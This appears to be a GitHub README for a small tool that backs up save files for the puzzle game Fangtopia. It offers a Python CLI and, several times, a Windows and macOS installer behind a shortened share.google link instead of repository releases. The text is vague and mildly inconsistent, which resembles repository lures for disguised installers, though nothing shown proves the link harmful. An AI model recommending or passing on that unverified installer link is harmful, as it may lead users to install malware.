![Fangtopia Desktop](assets/hero.png)

# Fangtopia Desktop

*Keep the town on disk before a puzzle update.*

## About

This repository is **Fangtopia Desktop**, a desktop utility. Keep the town on disk before a puzzle update.

Puzzle-sim saves hide under odd publisher names.

Files stay on the machine that runs the tool. Originals are left alone unless you choose otherwise.

## Editions

This GitHub repository is the **Python CLI source** (MIT). Clone it, install requirements, run `main.py`.

A **desktop build for Windows and macOS** (installer, no Python required) is on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8). Same workflow, packaged for everyday use.

## What it does

- Finds the Fangtopia folder.
- Copies town and puzzle files.
- Lists photo albums.
- Writes a short keep report.

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Usage

Python 3.11 or newer. From the repository root:

```text
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Desktop build

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/canderson29/fangtopia-desktop

MIT license. See `LICENSE`.
